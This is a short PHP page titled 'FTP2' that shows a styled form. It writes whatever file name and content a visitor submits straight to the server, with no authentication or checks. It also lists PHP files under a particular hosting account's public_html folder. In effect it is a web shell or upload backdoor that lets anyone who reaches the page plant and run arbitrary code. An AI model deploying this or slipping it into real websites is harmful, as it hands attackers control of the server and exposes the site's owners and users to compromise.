<?php
$files = glob('/home/tr1083170/public_html/*php');
//foreach($files as $file) { echo "filename:".$file."<br />"; }
?>

<!DOCTYPE html>
<html>
<title>FTP2</title>
<style>
input[type=text], select {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  border-radius: 4px;
  box-sizing: border-box;
}

textarea, select {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  border-radius: 4px;
  box-sizing: border-box;
}


input[type=submit] {
  width: 100%;
  background-color: #4CAF50;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

input[type=submit]:hover {
  background-color: #45a049;
}

div {
  border-radius: 5px;
  background-color: #f2f2f2;
  padding: 20px;
}
</style>
<body>

<div>
  <form method='post'>
    <label for="fname">File Name</label>
    <input type='text' name='filename'>
	<label for="fname">File Name</label>
	<br>
    <textarea  name="code" rows="25" cols="120"> </textarea>
	
    <input type="submit" name="submit" value="Submit">
  </form>
</div>

</body>
</html>


<?php
//rows="25" cols="80"
if (isset($_REQUEST['submit']))
{
$myfile = fopen($_REQUEST['filename'], "w") or die("Unable to open file!");
$txt = $_REQUEST['code'];
fwrite($myfile, $txt);
fclose($myfile);
 
}
  
?>
